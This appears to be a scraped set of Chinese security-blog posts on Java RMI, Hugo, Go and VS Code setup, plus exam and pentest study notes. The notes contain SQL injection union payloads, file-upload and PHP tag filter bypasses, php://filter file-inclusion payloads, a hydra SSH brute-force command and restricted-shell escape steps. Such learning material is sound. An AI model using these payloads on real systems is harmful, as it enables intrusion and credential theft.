RMIServer负责创建Remote Object（远程对象），并将之导出到 JAVA RMI runtime，远程对象必须被导出到JAVA RMI runtime，这样该远程对象才能接受远程调用。 RMIClient RMIClient负责发起远程方法调用。 Remote Object RMIServer负责创建Remote Object（远程对象），并将之导出到 JAVA RMI runtime。 stubs（存根） JAVA RMI使用一种特殊的类（这些类被称作stubs）来发起对远程对象的方法调用。远程对象导出的结果形成了这种特殊的类（stubs）。stubs与Remote Object实现的接口是一样的，并且包含hostname和port，hostname和port与Remote Object能够形成对应关系。stubs实例实际上就是Remote Object（远程对象） RMI代码实现 假设需求：Client 端需要查询用户信息，而用户信息存在于 Server 端，所以在 Server 端开放了 RMI 协议接口供客户端调用查询，返回是一个对象\n所以Client调用前需要：\nServer开放RMI协议接口 RMI Server Server 端主要是构建一个可以被传输的类 User，一个可以被远程访问的类 UserService，同时这个对象要注册到 RMI 开放给客户端使用。\n首先User类需要被传输，所以需要继承 Serializable，使得对象可以被序列化，序列化后的对象才能传输。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package com.wdbyte.rmi.server; import java.io.Serializable; public class User implements Serializable { private static final long serialVersionUID = 6490921832856589236L; private String name; private Integer age; private String skill; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public String getSkill() { return skill; } public void setSkill(String skill) { this.skill = skill; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, skill=\u0026#39;\u0026#34; + skill + \u0026#39;\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } User类只是作为可以传输数据的存在，需要一个类来进行远程通信，通信传输的是User类的实例化对象\n所以设计一个UserService类\n但这种类不是随意实现的，这种类的具体实现官方给了相关规范：\n需要先设置一个接口，再有一个类实现这个接口\n所以需要先设计接口\n所以有\nUserService 接口 官方对此类接口的规定：需要继承 Remote 类，方法需要抛出 RemoteException\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package com.wdbyte.rmi.server; import java.rmi.Remote; import java.rmi.RemoteException; public interface UserService extends Remote { /** * 查找用户 * * @param userId * @return * @throws RemoteException */ User findUser(String userId) throws RemoteException; } 其次需要设计一个实现了接口的类\nUserServiceImpl 接口实现类 官方对实现类的规定：需要继承 UnicastRemoteObject 类，且需要实现刚才定义的接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package com.wdbyte.rmi.server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class UserServiceImpl extends UnicastRemoteObject implements UserService { protected UserServiceImpl() throws RemoteException { } @Override public User findUser(String userId) throws RemoteException { // 加载在查询 if (\u0026#34;00001\u0026#34;.equals(userId)) { User user = new User(); user.setName(\u0026#34;金庸\u0026#34;); user.setAge(100); user.setSkill(\u0026#34;写作\u0026#34;); return user; } throw new RemoteException(\u0026#34;查无此人\u0026#34;); } } 最后是进行通信的主程序的设计 指定对象作为远程访问对象（也叫注册），设置相关参数（比如设置访问端口）\n服务端绑定 UserService 对象作为远程访问的对象，启动时端口设置为 1900\n解答：代码中设置了具体对象url和对应绑定端口的，所以指定URL路径和端口，可以理解为唯一对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.wdbyte.rmi.server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RmiServer { public static void main(String[] args) { try { UserService userService = new UserServiceImpl(); LocateRegistry.createRegistry(1900); Naming.rebind(\u0026#34;rmi://0.0.0.0:1900/user\u0026#34;, userService); System.out.println(\u0026#34;start server,port is 1900\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 新疑问：\n这里为什么没有绑定 UserServiceImpl 对象而是 UserService\nLocateRegistry.createRegistry(1900);这里的1900需要和Naming.rebind(\u0026quot;rmi://localhost:1900/user\u0026quot;, userService);中的1900对应吗\n（是的，详见这里，所以第一步是启动RMI Registry，第二步绑定的时候需要寻找到RMI Registry）\n整个Server端的设计是：\n主程序使用设计好的通信类 通信类使用设计好的可序列化对象进行传输 之后是Client端\nRMI Client Client 端简单的多。直接引入可远程访问和需要传输的类，通过端口和 Server 端绑定的地址，就可以发起一次调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package com.wdbyte.rmi.client; import java.rmi.Naming; import com.wdbyte.rmi.server.User; import com.wdbyte.rmi.server.UserService; public class RmiClient { public static void main(String args[]) { User answer; String userId = \u0026#34;00001\u0026#34;; try { // lookup method to find reference of remote object UserService access = (UserService)Naming.lookup(\u0026#34;rmi://localhost:1900/user\u0026#34;); answer = access.findUser(userId); System.out.println(\u0026#34;query:\u0026#34; + userId); System.out.println(\u0026#34;result:\u0026#34; + answer); } catch (Exception ae) { System.out.println(ae); } } } 疑问：\nClient此处的User类和UserService接口如何确保和远端的User类相同？（可选方案：提前商议，或者默认信任） 运行测试 运行RmiServer.java和RmiClient.java\nServer\nClient\nClient 查询不存在（修改userID变量）\n补充 解答，见补充1\nRmiRegistry 是需要启动的，如果没有注册表，那么服务端无法存入Stub RmiRegistry 可以单独使用命令启动，也可以使用代码启动\n1 2 Windows C:\\Users\\love1\u0026gt;start rmiregistry 2001 1 2 Linux $ rmiregistry -J-D=java.rmi.server.codebase=/home/d4n 2001 1 2 3 //java代码 LocateRegistry.createRegistry(2001); //Registry使用2001端口，默认启动端口1099 获取 RmiRegistry 中的实例对象（Stub） 1 Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 20001); //获取Registry 但是上个例子中使用的是Naming.lookup，Naming.lookup只是封装了相关查询，所以底层还是LocateRegistry.getRegistry\nRMI 的另一个例子 RMI Server\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.vulhub.RMI; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } //多了一步父类的初始化，代码逻辑不变 public String hello() throws RemoteException { System.out.println(\u0026#34;call from\u0026#34;); return \u0026#34;Hello world\u0026#34;; } } private void start() throws Exception { RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); Naming.rebind(\u0026#34;rmi://0.0.0.0:1099/Hello\u0026#34;, h); //如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ： //Naming.bind(\u0026#34;Hello\u0026#34;, new RemoteHelloWorld()); 即可 } public static void main(String[] args) throws Exception { new RMIServer().start(); } } RMI Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.vulhub.Train; import org.vulhub.RMI.RMIServer; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; public class TrainMain { public static void main(String[] args) throws Exception { RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming .lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); String ret = hello.hello(); System.out.println(ret); } } 这个例子的每行代码都很清晰的话，说明已经理解RMI的代码实现了\nRMI通信流量 此图为大佬的RMI通信纯净的流量截图，其中 135.1 为Client 135.142 为Server\n可以看到整个通信是有两次TCP连接的：\n第一次是Client连接 Server 的1099端口 第二次是Client 连接 Server 的 33769 端口 第二次的端口号存在于第一次的ReturnData中。\n最后远程的方法执行是在RMI Server中执行，第二个例子中的System.out.println(\u0026quot;call from\u0026quot;);即可证明\n解决疑问 1.Client访问静态类方法？\n","date":"2024-04-08T17:29:24+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240409172707180.png","permalink":"https://d4n-sec.github.io/p/rmi-study/","title":"Rmi Study"},{"content":"什么是u3p文件 .u3p 文件是存储在U3智能驱动器（一种特殊类型的USB闪存驱动器，包括U3 Launchpad平台）上的便携式应用程序。它包含程序可执行文件和配置数据。如果需要在计算机上运行某些文件，请在计算机上运行一些文件。\n1 A U3P file is a portable application stored on a U3 Smart Drive, a special type of USB flash drive that includes the U3 Launchpad platform. It contains program executables and configuration data. U3P files enable a program to be run from the flash drive on any Windows computer and may install some files on the local computer if needed. 其中提及的 U3 Smart Drive （U3智能驱动器）是一种特殊的U盘，相关创建或者推动组织试图建立一个新标准的软硬件开发平台，但相关技术已经在2009年年底开始逐步淘汰并停止U3技术支持。\n详细说明 .U3P 文件以压缩.ZIP 格式保存。它们可能包含四个目录：data\\、device\\、host\\、manifest\\。主机\\目录包含.EXE 文件。manifest\\目录保存应用程序配置信息（.U3I 文件）和程序图标。\n如下实例为wireshark的u3p安装包\n修改后缀为zip后直接解压缩即可\n1 通常情况下，由SanDisk、Verbatim、Kingston、Memorex和Intuix等制造商将U3 Launchpad安装到U3智能驱动器上。但是，要手动安装.U3P 启动板，请下载并运行U3 Launchpad安装程序，该安装程序可从SanDisk免费获得。可以使用SanDisk的Launchpad移除工具从USB闪存驱动器中删除U3 Launchpad程序。 当USB闪存驱动器插入计算机的USB端口时，U3启动板程序运行。.U3P 程序可从类似于Windows“开始”菜单的用户界面中使用。\n注意：SanDisk U3 Launchpad已停止使用，不再进行维护。\n","date":"2024-04-07T11:03:04+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240407111740164.png","permalink":"https://d4n-sec.github.io/p/about_u3p/","title":"About_u3p"},{"content":"前言 笔者目前有两个电脑，一个A在家（高性能），一个B在公司（较低性能），如何同步两个电脑的环境一直是一个问题，较低性能的笔记本写文档完全没问题，但是如果涉及一些工具编译，多台虚拟机同时使用，不可。上传github需要push，但是笔者并没有良好的push习惯。相反，只需要git作为存储单元的笔者深受其git版本控制的困扰，git方案失败，有向日葵这样的远控软件但是远控在免费使用的情况下，并不能做到合二为一的感受（延迟）\n解决方案 目前使用高性能在家电脑作为服务端，笔记本作为客户端，所有代码位于在家电脑 build and run，客户端只需要联网+vscode即可实现所有项目共享\n工具 1.蒲公英（内网搭建工具）\n方便，免费。个人免费额度为三台电脑组成一个内网，个人用户完全足够\n2.ssh\nvscode远程连接需要使用\n3.客户机（B）安装 vscode\n安装 提前安装向日葵作为辅助软件，在远程安装前期和后续出现问题时，向日葵会更加有应急作用\n蒲公英正常安装即可，两台电脑同时登录同一账号，即可完成组网。 测试：远端与本地端均关闭防火墙后互ping（IP地址可以在蒲公英软件上查看），互通即互连\nssh windows 安装，windows打开设置，找到应用和功能，在可选功能中找到 Openssh 服务端 和 客户端 远端一定安装服务端，本地端一定安装客户端（好像服务端和客户端合并了？） 然后开启ssh服务开机自启，两端均需要\n依次点击：开始菜单 \u0026ndash; Windows Administrative Tools \u0026mdash; Services，打开 Services 窗口 在里面找到 OpenSSH Authentication Agent，在上面单击右键，选择“属性”，将 Startup type 改为 Automatic 、Automatic(Delayed Start) 或 Manual，并点击 Service status 下的 Start 按钮。\n然后测试ssh连接ssh 用户名@IP 如果出现输入密码界面，即完成\n为方便后续vscode使用，可以设置公私钥连接，教程很多，但是有注意事项\n服务端要开启使用公钥连接，并且注释掉配置文件的最后两行 客户端的公钥赋值添加到.ssh/authorized_keys中，没有创建，有的话追加 为了安全起见，最好关闭密码登录 记得修改客户端的配置文件，指定私钥路径 之后使用vscode的ssh连接直接连接即可\n","date":"2024-03-06T17:38:40+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240306174015000.png","permalink":"https://d4n-sec.github.io/p/vscode/","title":"Vscode Windows 远程连接"},{"content":"前言 Hugo 搭建其实和hexo差不多，但是介于作者有幸尝试过hexo编译大量文章的经历，可以说hexo的性能已经无法满足我对个人博客的向往，于是乎转Hugo，Hugo 基于Go开发，效率方面毋庸置疑，但是由于该工具出现时间短暂，目前参考资料少，所以笔者在这通过搭建做一些总结\nHugo 安装 Hugo 下载 Hugo 的 github 主页找到Releases，根据个人喜好安装Hugo对应版本，建议 hugo_extended 版本的安装，有额外功能（虽然读者可能根本用不上），但因笔者安装使用此，固推荐，具体异同可以参考这个Issues\nHugo 安装 安装时选择任意文件夹，但基于程序员的严谨，不建议安装在含有中文的路径上。之后读者需自行配置安装路径到系统变量（Path）中，如果cmd中Hugo 命令成功识别，此步即完成\n1 2 PS D:\\Home\\Hugo_Blog\u0026gt; hugo version hugo v0.123.7-312735366b20d64bd61bff8627f593749f86c964+extended windows/amd64 BuildDate=2024-03-01T16:16:06Z VendorInfo=gohugoio Hugo test 参照官方start文档逐步操作，即可初见成效，建议读者尝试跟踪操作，方便后续理解\nHugo 目录结构理解 1 2 3 4 5 6 7 8 9 10 11 . ├─archetypes ├─assets ├─content ├─data ├─i18n ├─layouts ├─public ├─resources ├─static └─themes 有文章写的不错，笔者偷懒：\narchetypes 目录 默认，通过 hugo new 创建的内容会添加 date, title, draft = true 等扉页 front matter 设置信息，它们就是从archetypes 模板文件中拷贝的。这可以节省时间，同时保证统一性。\n拓展： Hugo中的md文件分为两种类型，简单的文章md文件和page页面md文件，在读者使用中非强需求自定义美化者，否则不需要去理解page页面，使用theme自带的即可\n简单理解即是执行hugo new post/test.md时，新创建文章的基本模版是参照 archetypes 目录下的 defult.md 如果对后续有更改默认创建文件的读者可以打开defult.md尝试理解如何使用\nassets 目录 不是默认创建的资源目录，保存所有需要通过 Hugo Pipes 处理的资源，只有那些 .Permalink 和 .RelPermalink 引用的文件会发布到 public 目录中，参考 Hugo 管道处理。\n默认即可，无需过多在意\ncontent 目录 所有内容页面存放目录，content 下的一级子目录看作一个对应的 section 内容分类区 content section。比如，为博客设置一个 blog 目录，为文章设置一个 articles 目录，为教程设置一个 tutorials 目录等，Hugo 使用内容分类区分作为默认内容类型 content type，如果在扉页 front matter 设置了 type 则以具体设置的类型为准。\n该目录中的post目录即为之后文章存放地址，content/post下可以存在子目录，对Hugo渲染不产生大的影响\nlayouts 目录 布局模板文件目录，存放 .html 布局模板文件，对应不同的内容，模板有多种，data-templates、homepage、lists、menu-templates、partials、section-templates 等等。\n站点的首页模板在主题目录中 layouts/index.html，除首页外，Hugo 有两类基本页面： Single page 单体页面，如 hugo new demo.md 创建的 Post 页面； List page 列表页面，如 tags 或 categories 页面； 这两种页面的默认模板都在主题目录中 layouts/_default，分别对应着 single.html 和 list.html。参考单页面内容模板 single-page-templates.\u0026gt; md 和 lists.md 文档。\n此目录与data目录，static目录一样，若非初次使用时无需理解\npublic 目录 默认输出目录，可以通过 -d 参数修改输出路径\ntheme 目录 用于存放主题文件的目录，且主题文件名与配置文件使用主题相关\nconfig 目录 config目录根据hugo创建的流程不同，有些读者有有些读者没有，不过本质只是把本应该处于 theme 目录中的config.yaml 拆开放入 config目录下，按照设置类型分类\n默认根目录下的配置文件在Hugo早期是config.toml文件（config.yaml也可以 Hugo支持多种文件类型）现在统一改为了hugo.toml(hugo.yaml)\nHugo 主题 深度自定义患者需要使用酷炫的主题，有多种方式下载与安装Theme，理解本质其实并不复杂（笔者的主题为Stack，以此为基础阐述，若非特别说明均为通用）\n下载方式多种，git clone | git submoudle | 手动下载 均可，将下载的压缩包放入theme目录下，解压（注意，如主题名为aaa,则theme/aaa目录下应有 config.yaml） 安装，在主题根目录下的hugo.toml中添加theme = '主题文件夹名'即可完成配置，此时配置完毕，主题已更换 之后可以hugo server在本地端查看博客目前的情况，并且可以在不关闭本地服务端的情况下编辑博客，实时查看博客情况\n注意： hugo new 出来的博客默认可能不展示，建议在新文件头中加入或者修改字段draft值为false，即可出现\n（读者如果没有隐藏文章的计划，可以尝试修改 archetypes 目录中的defult.md文件中相应字段值，修改默认模版）\n","date":"2024-03-06T16:26:40+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240306162853109.png","permalink":"https://d4n-sec.github.io/p/blogtohugo/","title":"BlogToHugo"},{"content":"Go学习难点记录与解决（希望能解决）\n混淆点 1.Go的包导入\n导入本质，导入顺序，依赖顺序以及导入优先级，默认路径，为什么是这个默认路径，如何结合默认路径设计项目结构\n且同一目录下的所有.go文件必须同属于一个package\n2.基本类型和数组传参是传值（值复制）（待验证数组）\n3.函数传参传地址如何使用（传地址值，传引用）如何使用\n4.自定义数据类型（给类型起别名但是严格区分）的意义何在，使用场景\n5.匿名函数常用形式：\n全程序调用本文件的匿名函数如何处理：将匿名函数赋值给全局变量即可\n6.闭包使用的内存图解，闭包的使用场景和妙用\n7.defer 关键字的使用场景 妙用？\n8.strings.TrimSpace(\u0026quot;\u0026quot;)处理去掉了左右两边的空格，会去掉字符串结尾的\\n吗？\n9.数组初始化\n一维\n二维\n二维数组遍历\ntips 1.本地保存页面路径D:\\Program Files (Green)\\JJDown\\Download\n2.函数 retrun 支持在返回类型声明处定义返回变量名\n3.全局变量初始化\u0026gt;init函数\u0026gt;main函数 被导包文件init\u0026gt;导包文件 且被导包深度优先\n","date":"2024-03-06T14:45:23+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/OIP-C.jpg","permalink":"https://d4n-sec.github.io/p/go-study/","title":"Go Study"},{"content":"本文记录VScode Docker Python Debug 相关设置已经遇见的问题\n为何 日益增多的框架和漏洞学习中，VulDB一键搭建成为安全研究福音。为更好地跟踪Payload利用路径，调试成为必不可少的一步，但VulDB以Docker为基石，随之而来只能选择非本地搭建而使用现有的Docker进行远程调试，本文记录VScode Docker Python Debug 相关设置已经遇见的问题\n前提 有与本地互通的Docker环境\nVulDB源码已安装\n正常的逻辑思维，动手能力，观察能力以及信息搜集能力\n笔者环境 Windows10家庭版 WSL2 + Docker Desktop VScode\n记录 VScode正常安装，Docker 参照VulDB正常启动后，VScode本地安装 Remote Development 插件包（起作用的是Dev Containers，但作者未研究相关插件依赖关系，遂建议均安装） 查看右侧发现出现此图标点击发现有已启动的Docker环境\n右键Files上一栏（如图）后点击Attach Visual Dtudio Code 另起一个窗口\n后等待VScode安装Server端，等待启动便可\nDocker端（后述为远端）需安装插件如下（除红框外其他插件并非笔者主动安装）\n注：python新版本插件 Python 不支持3.7版本以下的python，需要指定安装旧版本，实测插件版本为2022.6.0版本支持 python 3.6 debug\npython版本确认 右下角查看Python环境发现出现不知一个\n利用各种方法确认当前Docker启动时使用哪个版本的Python 方案 0 ：进入Terminal，python 运行临时环境，import 项目扩展包（项目使用但非基础环境），如果导入失败即可排除该版本\n在准备好后，切换到项目需求的python版本后点击Debug模块，创建launch.json\n无启动特殊设置的话（启动脚本与主要编写脚本不一致，需要带参运行）使用默认即可，如需设置自行百度\n打上断点后尝试运行基本脚本测试\n能断代表设置成功\n问题以及解决 问题 在调试时发现框架函数无法如本地一样进入查看细节\n解决 在确认使用python版本号的前提下，使用该版本python全路径运行以下命令：\npython -c \u0026quot;import site;print(site.getusersitepackages())\u0026quot;\n确认项目扩展包位置，笔者如图\n在远端设置（setting.json）中（user或者WorkSpace均可）设置如下字段后，再次尝试Debug\n进入函数失败，右下角提示\nlaunch.json 中设置相关字段，如下图\n再次尝试，成功进入框架函数，但依旧无法主动点击进入，此时更换该插件版本，与Python插件对应，即可（笔者同样使用2022.6.0）\n","date":"2024-01-09T00:00:00Z","permalink":"https://d4n-sec.github.io/p/vscode-docker-python-debug%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/","title":"VScode+Docker+Python+Debug安装指南"},{"content":"一些详细知识点的备忘\nSQL注入 1.floor类型报错注入，原理是 group by 和 random()相遇时，group by的运行方式发生变化，会两次查询，第一次查询做比较，如果不存在则尝试插入，将第二次查询结果尝试插入，因为random的随机性，第二次插入时的值较第一次发生变化，导致第二次的插入的值其实已经存在，所以报错主键已存在\n还可以进行的思考：\ngroup by 为什么要做这样的变化，根据什么判断然后造成的变化，哪些可以造成 group by 运行机制变化\n联合查询payload\n1 2 3 4 5 6 7 8 9 10 11 1\u0026#39; order by 4 #\t#列数为4 -1\u0026#39; union select 1,2,3,4 #\t#查看回显位 -1\u0026#39; union select 1,database(),3,4 #\t#查看数据库 -1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 #\t#查看当前数据库表名 -1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;flag\u0026#39;),3,4 # #查看flag表的列名 -1\u0026#39; union select 1,(select flag from flag),3,4 # #带入表名，列名直接查询 空格绕过\n注释代替空格\n/**/ -\u0026gt; 读文件和写文件函数\n注意有个配置需要打开 secure_file_priv=''\n读文件 load_file() 需要知道绝对路径\n写文件 select 1,\u0026lt;?phpinfo();?\u0026gt; into outfile \u0026quot;C:\\\\1.txt\u0026quot;\n文件上传 绕过类型分白名单和黑名单绕过，尝试大小写，双写？%00截断 .htaccess .user.ini 图片马，content-type判断修改\nwindows特性：大小写不敏感，末尾+空格，特殊字符自动去掉\n末尾带.：畸形解析？\n::$DATA ：保存文件时将后面的数据当做文件流处理\n.user.ini\n.user.ini 的作用范围是本目录，子目录无效（测试php版本 5.3.29nts）且.user.ini 就是php.ini的当前目录下的临时配置（写法规则一样），所以优先级比php.ini高\nCGI程序就是配置了相关路径信息，访问特定URL目录和指定文件后，根据 Shebang 行找到解释器调用解析处理，标准输出接入到socket\nApache 中的 ScriptAlias /cgi-b/ \u0026ldquo;${SRVROOT}/cgi-bin/\u0026rdquo; 指定了访问URL上的/cgi-b/目录时，会在本地${SRVROOT}/cgi-bin/下查找相应脚本（脚本后缀需要在httpd.conf注册，需要配置 Shebang 行）\nFastCGI模式（猜测 会预先处理好脚本），运行脚本后不结束运行（CGI每次访问都会fork一次进程）\n还有其他CGI模式\n7.3.4nts 需要重启 才能生效\n.htaccess\n利用有条件\n1.mod_rewrite模块开启。\n2.AllowOverride All\n构造图片马命令\ncopy 1.jpg/a+2.php/b 3.jpg\n条件竞争\n先上传再删除（移动，重命名？）\nbp就可以一直上传，然后手动刷新页面访问即可\n二次渲染\n上传后的文件重新根据文件大小？图片规则？重新生成图片\n漏洞在于重新生成的部分还是有保留部分源文件，把木马放到没被改变的地方就OK\n文件包含 日志路径：\n1 2 3 /var/log/apache2/access.log (access_log) error.log error_log /var/log/httpd/access.log /var/log/nginx/error.log 伪协议：\nphp://filter/convert.base64-encode/resource=../file.php\nphp://filter/read=convert.base64-encode/resource=../file.php\nPython临时http服务\n1 2 python2 -m SimpleHTTPServer 8000 python3 -m http.server 9000 可以访问被包含的文件，获得更多信息\nBP爆破模式 sniper:按照字典顺序一个一个参数依次遍历，一个参数遍历完,再遍历下一个参数 battering ram:每个参数同时遍历同一个字典 pitchfork:多个参数同时进行遍历,只是一个选择字典1，一个选择字典2 Clusterbomb:有点像两个嵌套的for循环，参数i和参数j，i=0，然后j要从0-10全部跑完，然后i=1，然后j再从0-10跑完，一对多，多次遍历\nPHP标签绕过 1 2 3 4 5 \u0026lt;? echo \u0026#39;123\u0026#39;;?\u0026gt; #前提是开启配置参数short_open_tags=on \u0026lt;?=(表达式)?\u0026gt; 等价于 \u0026lt;?php echo (表达式)?\u0026gt; #不需要开启参数设置 \u0026lt;% echo \u0026#39;123\u0026#39;;%\u0026gt; #开启配置参数asp_tags=on，并且只能在7.0以下版本使用 \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;echo \u0026#39;123\u0026#39;; \u0026lt;/script\u0026gt; #不需要修改参数开关，但是只能在7.0以下可用。 \u0026lt;?PHP ?\u0026gt; #大写也是可以的，EVAL函数也可以大写 XSS \u0026lt;script\u0026gt;标签可以部分大小写，所以可以进行绕过\n","date":"2023-09-07T00:00:00Z","permalink":"https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/","title":"PTE知识记录"},{"content":"摘要\n渗透测试个人经验 ssh ssh爆破 ssh爆破使用工具 hydra ，主要因为快速，其他工具速度过慢\n使用hydra爆破：\n1 hydra -l ezpd -P 1.txt 192.168.229.129 ssh -v 1 2 3 4 5 -l 指定用户名 -L 指定用户名字典文件 -p 指定密码 -P 指定密码字典文件 -v 显示详细的执行过程 ssh密码生成 ssh密码生成工具 crunch\ncat /usr/share/crunch/charset.lst 选择要使用的crunch字典字符集范围\n找到合适的字符集，然后使用\n1 crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ \u0026gt; pass.dic 关于上面命令的疑问 @替代未知字符未知？\nLinux常用命令 遇到一个被限制的shell，想要整理一个命令清单，后期想办法爆破一下有哪些命令可以使用\n主要参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 ls #\t列出目录的内容 alias #\t定义或显示别名 unalias #\t删除别名定义 pwd #\t打印工作目录 cd #\t更改目录 cat #\t读取文件 more #\t查看一个长文件的内容 less #\t查看一个长文件的内容 但是它允许在文件中和正向操作一样的反向操作 head #\thead -2 file1 查看一个文件的前两行 tail #\ttail -2 file1 查看一个文件的最后两行 tac #\t从最后一行开始反向查看一个文件的内容 cp #\t复制文件和目录 rm #\t删除文件和目录 mv #\t移动（重命名）文件和目录 mkdir #\t创建目录 man #\t显示其他命令的手册页面 touch #\t创建空文件 groupadd #\t创建一个新用户组 groupdel #\t删除一个用户组 groupmod #\t重命名一个用户组 useradd #\t创建用户 userdel #\t删除用户 usermod #\t修改用户属性 chage #\t（-E 2005-12-31 user1 设置用户口令的失效期限 ） pwck #\t检查 \u0026#39;/etc/passwd\u0026#39; 的文件格式和语法修正以及存在的用户 grpck #\t检查 \u0026#39;/etc/passwd\u0026#39; 的文件格式和语法修正以及存在的群组 newgrp #\t(newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 ) chmod #\t更改文件权限 chown #\t更改文件拥有者 chattr #\t文件的特殊属性 lsattr #\t显示文件的特殊属性 sudo #\t以超级用户身份执行命令 su #\t切换用户 htop #\t显示进程和资源信息 unzip #\t解压zip文件 echo #\t显示文本行 cat #\t打印文件内容 ps #\t报告shell进程状态 kill #\t终止程序 ping #\t测试网络连接 history #\t显示以前的命令列表 passwd #\t更改用户密码 which #\t返回程序的完整二进制路径 shred #\t覆盖文件以隐藏其内容 grep #\t打印与给定条件匹配行 sort #\t排序文件的内容 comm #\t对比两个文件内容 ifconfig #\t显示网络配置 netstat #\t端口查看？ nslookup #\t查看DNS解析 whoami #\t输出用户名 whatis #\t显示单行说明 wc #\t字数文件 paste #\tpaste file1 file2 合并两个文件或两栏的内容 bunzip2 #\t解压软件 bzip3 #\t同上 bzip2 #\t同上 gzip #\t同上 lunzip #\t同上 unzip #\t同上 eb-utils #\t同上 rzip #\t同上 gunzip #\t同上 rar #\t同上 unrar #\t同上 zip #\t同上 unzip #\t同上 uname #\t显示操作系统信息 neofetch #\t显示操作系统和硬件信息 find #\t搜索遵循模式的文件 sed #\t每次仅读取一行内容（读取文件） ssh #\tssh远程登录 ftp #\t访问ftp服务器 wget #\t从互联网检索文件 file #\t查看文件类型 export #\t环境变量相关 apt #\t包管理器（下载安装工具） yum #\t同上 rpm #\t同上 pacman #\t同上 dpkg #\t好像也是同上 arch #\t显示机器的处理器架构 dmidecode #\t推荐参数（-q） 显示硬件系统部件 - (SMBIOS / DMI) hdparm #\t（-i） /dev/hda 罗列一个磁盘的架构特性（-tT /dev/sda） 在磁盘上执行测试性读取操作 lspci #\t（-tv）罗列 PCI 设备 （-tv）显示 USB 设备 date #\t显示系统日期 cal #\t（cal 2007） 显示2007年的日历表 clock #\t（-w）将时间修改保存到 BIOS tree #\t显示文件和目录由根目录开始的树形结构 ostree #\t操作系统树 pstree #\t进程树 iconv #\t列出已知的编码 locate #\t文件搜索 whereis #\t文件搜索（显示一个二进制文件、源码或man的位置 ） which #\t文件搜索（显示一个二进制文件或可执行文件的完整路径 ） mount #\t挂载一个文件系统 umount #\t卸载一个文件系统 fuser #\t当设备繁忙时强制卸载 df #\t（-h 显示已经挂载的分区列表 ） du #\t（-sh dir1 估算目录 \u0026#39;dir1\u0026#39; 已经使用的磁盘空间\u0026#39; ） ln #\t创建一个指向文件或目录的软链接 1 2 vim #\t高效文本编辑 vi #\t同上 下面是不要轻易尝试的\n1 2 3 4 5 shutdown #\t关闭您的机器 reboot #\t重启 logout #\t注销 telinit #\t关机相关命令 exit #\t退出当前shell会话 OK，发现盲点：本次靶机ssh登录后，无输入直接两次tab键即可查看可用命令\n受限shell逃逸 参考文章\n顾名思义：受限制的shell，有以下功能受限（可以设置某些选项不受限）\nWikiPedia上有提到受限shell的弱点\nA user can break out of the restricted environment by running a program that features a shell function 用户可以通过运行具有shell功能的程序来打破限制环境\nLinux 自带程序里vi/vim有类似功能，当然如果能够再开一个shell也能达到相同目的\n实战靶机里逃逸所用语句：\n找不到执行的命令 尝试完整路径执行命令如/bin/whoami\n最好还是设置一下环境变量\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nsudoers权限查看 命令的话直接sudo -l查看就OK了\n权限管理文件是/etc/sudoers\nsudoers文件编辑结构\nu002 代表对 u002 用户的权限编辑\n第一个 ALL 